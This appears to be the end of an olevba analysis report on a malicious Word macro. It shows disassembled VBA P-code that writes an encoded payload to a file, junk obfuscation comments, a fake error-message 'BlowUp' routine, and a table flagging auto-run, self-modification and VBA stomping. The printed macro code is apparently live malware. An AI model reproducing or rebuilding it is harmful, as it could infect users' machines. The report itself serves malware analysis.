' 	Add 
' 	PrintItemNL 
' Line #191:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M@],X7G.*822L0!N!E97:2P9H56;#/`1RT5Y6HF,W@-'&+R'!&@@`__].?&,7"
' 	PrintItemNL 
' Line #192:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "M:'8Q*_%G`FCG3"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "4M`X=VNM,,&:5DK^AQ"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "'V-EK"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "3\C->H7[P!WC;#KP3]?.&"
' 	Add 
' 	PrintItemNL 
' Line #193:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MCVZ-LVU]9@>DETPPK3-_LAW`X0<-_S!NP!/H`JVV=@>6,FD>CZQPPO-:./Z="
' 	PrintItemNL 
' Line #194:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M9=TE!75\SWCGO?UX4`WSD/'9&]AOC)0G%\KTC8[(J<8<,$GZ'*F9A\719-X%"
' 	PrintItemNL 
' Line #195:
' 	QuoteRem 0x0000 0x007A "rV\g^_,+.Nx7S=d?3j.`@++!ib*4gy)ZHb]f$ >[KkQY3f7u(%X-d60:{}}0[%ZlNXzAF8uvo%Q$J2C!4,"rP'{ VYT#7MPbxrF)cdLAyCc4nO53I0nkx@gy"
' Line #196:
' 	QuoteRem 0x0000 0x003D "tu4)~/vg;p>LEb~4[fGLL_L)J@l4%n]+5yh_6?Qi%_<>t/6kYfhqk;#D23""
' Line #197:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "M<!O4`.[J=(0I'(VGMN!IQ\]($M@$!L`N^L`RT?"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "!<Q=?#-(/=$;&'#(+RYB!"
' 	Add 
' 	PrintItemNL 
' Line #198:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MMCK`%W9PI+F]U5^,T'Y+_7$H>,/87W[3LW849GEOR4<76A)1<!D`EEZ7KAV3"
' 	PrintItemNL 
' Line #199:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "M./WP26U&2!BMOLO=4\8+'D&R!1&2"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F ")8(7]@8GKAC-Z%,)'+UR5L1*>=3;6JZ"
' 	Add 
' 	PrintItemNL 
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "M3U`D8;%/$&D^<PDO,@\Z:E54&>&6`R9/.J$T(1PQ(2`6\/19/)0'X"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 ";G33_S"
' 	Add 
' 	PrintItemNL 
' Line #201:
' 	QuoteRem 0x0000 0x001F "4z+K}@+x!k5w7n6gCexm,uDo*(WS4"
' Line #202:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "M=8$WBU#I`IPY&D?2)#U&@J9,&0:,['X%MWKKCW)[W$6ZP$O"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "AU3`K)(,L$08"
' 	Add 
' 	PrintItemNL 
' Line #203:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MF3+C6,K2UT3LT1PGJP/5D.2*VFXO<YY!+K-@T7/^9'Z54E)_6.B';HRBB>[!"
' 	PrintItemNL 
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "M$.W6#/]]A.GMAB'[8O?IR,/##S#2FVA;K:8#/MC!(:8\JX[-R8"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "AN:V(@Z]R"
' 	Add 
' 	PrintItemNL 
' Line #205:
' 	QuoteRem 0x0000 0x000D "2,@pLxIDSmd('"
' Line #206:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MU9L1F70R0>'DPVB_:E%8+4=5(39SK%0U$0Q:P-2#(`&4Y4$>M=:IY9729*AS"
' 	PrintItemNL 
' Line #207:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "MJ@.U6*(.RU-@?GXIX[\P*22*`3UVX$GMJJB!*WGVSD/NI(ZH0"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "3"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Z1<S"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "+!D"
' 	Add 
' 	PrintItemNL 
' Line #208:
' 	QuoteRem 0x0000 0x000F "9'8qzVZWWAG}4-'"
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "M[KO1\7&9B;B-U17MI(4"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0028 "X!3I-6\B5N%5);,ZZ(DP4P9Q9YHCKGJ$YU8T#HE."
' 	Add 
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "MQP&882)&+RG)L)B"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002C "X;1]%-TV3;TS%![R.]O.\&XSO$V>GJ5N`KS0>]#E4!1F"
' 	Add 
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "MLB+AE"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0036 "BSR(-W8/Z8MX`M%7.DLKU'%V.NH=N^A)_4XGK^C62I&TS1_3Q:%DL@"
' 	Add 
' 	PrintItemNL 
' Line #212:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "M2#!8RBEZ[L1DR231D45$[E@,&G@W.I.WBNF0$H>L%P6<B-!.[F-4,H:U"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "R)?"
' 	Add 
' 	PrintItemNL 
' Line #213:
' 	QuoteRem 0x0000 0x001E "{xK_gE/C*!E^`G5C'b+e*WfC&7@zH"
' Line #214:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "MGZ"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0016 "E5LLA>;+J3;71:*(A-\Y!'"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0014 "TWB*C!T0,P$4G.P`CD`J"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "L^\96>UYT+^[$"
' 	Add 
' 	PrintItemNL 
' Line #215:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M1;:*QW1+=F]*<&0E(VB6I8_Y`R=8PY15=0[,;'1<RM%6Y@`^8:YC/):(L34B"
' 	PrintItemNL 
' Line #216:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "MY#8GJW0^!P(AGU,!+P+%N$B<T#=$=ZNSM#->B"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0016 "$9]!7<[V4:X\):XZ/EH,?X"
' 	Add 
' 	PrintItemNL 
' Line #217:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "M`':7(EPQ1D6[%#'`=N0T$PR+4-KJ0WZBT!B"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0018 ",Z)N3@E_.9%P9Y,T7RXU]X[1"
' 	Add 
' 	PrintItemNL 
' Line #218:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "M=V&&^8YT,8"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0031 "VQ`-F1389.LXVM)N1T)T'N+3(VDI0-Q9!++$BF+Q6U7:CK-2]"
' 	Add 
' 	PrintItemNL 
' Line #219:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "M''^\T6>_Q0IFBQIJ%5NHY@SQEA#U*D1H*5"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0019 "7;.='Y(7@BSPM^Z,L?1\-YD;L"
' 	Add 
' 	PrintItemNL 
' Line #220:
' 	QuoteRem 0x0000 0x0024 "e'0AX#xP<_!U;MH#$q[i2cDdqVe2*m&5$/g/"
' Line #221:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "M0A69H1VQ]D\=AI!_H.WS34B4\5I8B+J*.B[Q4'.8[F9X0"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D ";F1>8H'K8P^14"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #222:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MP\%/*>!8)&U1-AE1;_*/0<?@3YTFQ\JNT**CRCN(R+S,;S`&BF&J^R7;S7B1"
' 	PrintItemNL 
' Line #223:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M<+XXXHQ0=$?&AW#)J@^$$/$X&ST>[<Q\-2!,PM!0UG'/2-T$1FE86=_^5UPP"
' 	PrintItemNL 
' Line #224:
' 	QuoteRem 0x0000 0x0020 "VRy\imj;CL\Mq1;>);T u]b7E^9{5]*1"
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "M;M`$=&&-`,HD0B.MH_[*`%76&#U$Y`9XE]+)&D,).:L=W!C#3LOVQ1=B&-U"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #226:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "M>F])ZQ\AKB"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0031 "4N6$)LASV6C+@D8[3I0AE\$TEQ<3-VD/Z+Z_TC>/36?\+SXMB"
' 	Add 
' 	PrintItemNL 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "M`_86'\TI5_,6OC("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002C "1V['1K8YD!<98JN%[?VW#[P%BCG(N&.@B-,2^51O3;0("
' 	Add 
' 	PrintItemNL 
' Line #228:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MX33S.I1VE-V[KV*$?BSE)<.3;:&;1F0+#P=NH>(@HT/&-[1WTD+Y)=@>VQ-K"
' 	PrintItemNL 
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M5=YY/'V7IG:6?)7E?!?(JX54-EIF;2NKATBQ@'VOXR[SD-?7FBNV,D_G0@*!"
' 	PrintItemNL 
' Line #230:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "MN.$["
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "(!H5KEG3]_8W7$.%NSW)#IZ=[K/D\5J/O(&D()L5A73>T.<[X,;,1H\"
' 	Add 
' 	PrintItemNL 
' Line #231:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MMQQV#>+@CZ+>3'FS<:(E6@X+DSNI(2:R;2.UD+Z4]X%=Z3%2;4AU:G+3V(3)"
' 	PrintItemNL 
' Line #232:
' 	QuoteRem 0x0000 0x0051 ">#Br/@/Q5:5~/a[>rg8'b)tL0"._i 7SwLKQIi/c%T*<9/f4DP~r}/vvi:D:D?^GI-Z_X6||s'[[0QCD"
' Line #233:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "MV)`C>_6"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "KT7S>]+\%O@_4$L!`A0`%``"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "``@`@Q$"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "*X_5"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Q7N"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "0``#A8```@`"
' 	Add 
' 	PrintItemNL 
' Line #234:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M`````````0`@`+:!`````$EN9F\N:'1M4$L%!@`````!``$`-@```!0*````"
' 	PrintItemNL 
' Line #235:
' 	QuoteRem 0x0000 0x0070 "~"j<1C<#/|NqwOo9T'jSfsht%"6#1L4.z3;;al9Bf.}4XR0jXluF_xdWKkXi_.jTU~#tuyQs|w;Zesv[LSH`dy2p~~^urVMl1c!Z\ywRI'y3I"
' Line #236:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "!````"
' 	PrintItemNL 
' Line #237:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "`"
' 	PrintItemNL 
' Line #238:
' 	QuoteRem 0x0000 0x0056 "S.I1>+lNQXP6l?n"S"/os*vw"c4xuC\y:+q%fK#3EO)e{hp=,UT$ShgTbQNcCCP+yK5@B*Z<IBfWw4X~A54"
' Line #239:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "end"
' 	PrintItemNL 
' Line #240:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #241:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #242:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #243:
' 	EndIfBlock 
' Line #244:
' 	EndSub 
' Line #245:
' 	FuncDefn (Sub BlowUp())
' Line #246:
' 	LitStr 0x0021 "Unhandled Exception at FE35:5320h"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x000D "running on a "
' 	Add 
' 	Ld System 
' 	MemLd ProcessorType 
' 	Add 
' 	LitStr 0x000A " processor"
' 	Add 
' 	LitDI2 0x0010 
' 	LitStr 0x000F "Micro$oft Word "
' 	Ld Application 
' 	MemLd Version 
' 	Add 
' 	ArgsCall MsgBox 0x0003 
' Line #247:
' 	EndSub 
' Line #248:
' 	QuoteRem 0x0000 0x006B "g:|NxNE?5<}hb}"WFRUc5`L+i{80S%m'L[GbSx2Ql0ZQr<}`@1Q^nkw0GjvRVq8 giO[4bw"<lpja"1e(:1g3[Fdgx`vb::z-HV-RQqya"
' Line #249:
' 	QuoteRem 0x0000 0x0084 "2w9J$8w\[\:6qAn/1Nf mOBD,AIL73U6hPO6UqK]k0dH*H|\_`ke#qSor3=9O_*Ufxa(_iJ,o`mVZbQh*9eV^ne-tBor{i H*xq4'6Lubk}5Ei"6!5rHn5Hcy~ni9"
' Line #250:
' Line #251:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

